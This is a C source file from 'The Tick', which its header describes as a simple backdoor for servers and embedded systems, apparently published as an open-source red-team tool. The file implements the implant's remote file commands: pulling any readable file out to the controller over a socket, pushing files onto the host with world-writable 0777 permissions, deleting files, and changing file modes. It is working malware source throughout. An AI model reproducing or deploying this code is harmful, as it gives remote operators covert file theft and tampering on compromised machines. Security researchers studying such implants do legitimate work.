/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <libgen.h>

#ifdef _WIN32

#include <winsock2.h>
#include <windows.h>
#include <fileapi.h>

#define O_SYNC 0

#else

#include <sys/statvfs.h>
#include <arpa/inet.h>

#define O_BINARY 0
#define O_SEQUENTIAL 0

#endif

#include "common.h"
#include "parser.h"
#include "tcp.h"

#include "file.h"

// Helper functions to copy a file and socket streams.
// Optional "count" parameter limits how many bytes to copy,
// use <0 to copy the entire stream. Returns 0 on success, -1 on error.
#ifdef _WIN32

int copy_stream_socket_to_file(int sock, int fd, ssize_t count)
{
    ssize_t copied = 0;
    ssize_t block = 0;
    char buffer[1024];

    if (count == 0) return 0;
    while (count < 0 || copied < count) {
        block = (ssize_t) recv(sock, buffer, sizeof(buffer), 0);
        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
            return -1;
        }
        if (block == 0) {
            return 0;
        }
        copied = copied + block;
        while (block > 0) {
            ssize_t tmp = write(fd, buffer, block);
            if (tmp <= 0) {
                return -1;
            }
            block = block - tmp;
        }
    }
    return 0;
}

int copy_stream_file_to_socket(int fd, int sock, ssize_t count)
{
    ssize_t copied = 0;
    ssize_t block = 0;
    char buffer[1024];

    if (count == 0) return 0;
    while (count < 0 || copied < count) {
        block = read(fd, buffer, sizeof(buffer));
        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
            return -1;
        }
        if (block == 0) {
            return 0;
        }
        copied = copied + block;
        while (block > 0) {
            ssize_t tmp = (ssize_t) send(sock, buffer, block, 0);
            if (tmp <= 0) {
                return -1;
            }
            block = block - tmp;
        }
    }
    return 0;
}

#endif

// Helper function to get the free space available in a given mount point.
// Returns -1 on error.
ssize_t get_free_space(const char *pathname)
{
#ifdef _WIN32
    ULARGE_INTEGER free;
    free.QuadPart = 0;
    return GetDiskFreeSpaceExA(pathname, &free, NULL, NULL) == 0 ? -1 : (ssize_t) free.QuadPart;
#else
    struct statvfs svfs;
    if (statvfs(pathname, &svfs) < 0) return -1;
    return svfs.f_bfree * svfs.f_bsize;
#endif
}

// Implements the "pull" command.
void do_file_read(Parser *p)
{
    int file = -1;
    char *filename = (char *) &p->buffer;
    struct stat info;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure we have read access to the file.
    if (access(filename, F_OK) == -1) {
        LOG("Cannot find %s\n", filename);
        parser_error(p, "file not found");
        return;
    }
    if (access(filename, R_OK) == -1) {
        LOG("Cannot read %s\n", filename);
        parser_error(p, "file not readable");
        return;
    }

    // Open the file.
    file = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Make sure the file isn't empty.
    info.st_size = 0;
    stat(filename, &info);
    if (info.st_size == 0) {
        LOG("Cannot stat or empty file %s\n", filename);
        parser_error(p, "cannot stat or empty file");
        return;
    }

    // Make sure the file isn't too big to send.
    if (info.st_size > UINT32_MAX) {
        LOG("File too large %s\n", filename);
        parser_error(p, "file too large");
        return;
    }

    // Send the file in the response.
    // Close the connection if something goes wrong at this point.
    LOG("Reading file %s\n", filename);
    parser_begin_response(p, CMD_STATUS_OK, info.st_size);
    if (copy_stream_file_to_socket(file, p->fd, info.st_size) < 0) {
        parser_close(p);
        LOG("Error sending file (%ld bytes)\n", info.st_size);
    } else {
        LOG("Success (%ld bytes)\n", info.st_size);
    }
    close(file);
}

// Implements the "push" command.
void do_file_write(Parser *p)
{
    int file = -1;
    int success = -1;
    size_t available = 0;
    char *filename = (char *) &p->buffer;
    char *pathname = NULL;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure there's enough space in the target mount point.
    pathname = dirname(filename);
    if (get_free_space(pathname) < (ssize_t) p->header.data_len) {
        parser_error(p, "not enough free space");
        return;
    }

    // Open the file for writing.
    file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_BINARY | O_SEQUENTIAL, 0777);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Fix the mode (in case umask is messing with us).
    chmod(filename, 0777);

    // Save the file data as it comes from the socket.
    LOG("Writing file %s\n", filename);
    success = copy_stream_socket_to_file(p->fd, file, p->header.data_len);
    close(file);
    if (success < 0) {
        LOG("Error receiving file (%d bytes)\n", p->header.data_len);
        parser_error(p, "failed to write file");
        parser_close(p);
    } else {
        LOG("Success (%d bytes)\n", p->header.data_len);
        parser_ok(p);
    }
    p->header.data_len = 0;     // Make sure to reset this counter!
}

// Implements the "rm" command.
void do_file_delete(Parser *p)
{
    char *filename = (char *) &p->buffer;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Delete the file.
    if (unlink(filename) < 0) {
        LOG("Error deleting file %s\n", filename);
        parser_error(p, "could not delete");
    } else {
        LOG("Deleted file %s\n", filename);
        parser_ok(p);
    }
}

// Implements the "chmod" command.
void do_file_chmod(Parser *p)
{
    char *filename = (char *) &p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    if (recv_block(p->fd, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Chmod the file.
    if (chmod(filename, mode) < 0) {
        LOG("Error changing file mode to %03o %s\n", mode, filename);
        parser_error(p, "could not chmod");
    } else {
        LOG("Changed file mode to %03o %s\n", mode, filename);
        parser_ok(p);
    }
}
